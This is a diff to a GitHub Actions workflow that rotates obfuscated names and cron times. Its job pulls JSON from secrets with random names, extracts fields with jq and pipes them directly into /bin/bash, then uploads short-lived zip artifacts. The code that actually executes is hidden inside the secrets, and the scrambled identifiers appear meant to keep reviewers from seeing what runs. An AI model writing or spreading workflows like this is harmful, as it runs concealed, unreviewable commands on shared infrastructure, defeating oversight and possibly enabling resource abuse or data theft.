@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '5 4,10,16,22 * * *'
+    - cron: '54 2,8,14,20 * * *'
 permissions:
   contents: read
 concurrency:
@@ -20,19 +20,16 @@ jobs:
           fetch-depth: 1
       - name: Go
         env:
-          ivnuo194: ${{ secrets.ivnuo194 }}
+          g9644: ${{ secrets.g9644 }}
         run: |
-          printf '%s' "$ivnuo194" | jq -r .lhhbv3 | /bin/bash
-          printf '%s' "$w8926" | jq -r .eq867 | /bin/bash
-          echo $s240 | jq -r .mk34287 | /bin/bash
-          echo $on09 | jq -r .sogm3 | /bin/bash
-          echo $n65292 | jq -r .hyzk67901 | /bin/bash
-          printf '%s' "$ksxk1" | jq -r .vafok1 | /bin/bash
+          printf '%s' "$g9644" | jq -r .qg6238 | /bin/bash
+          printf '%s' "$l3953" | jq -r .yct07177 | /bin/bash
+          printf '%s' "$fby3" | jq -r .tr57 | /bin/bash
 
       - name: Store artifact
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: PlzGXI91
+          name: o032ot7y
           path: "*.zip"
           retention-days: 1
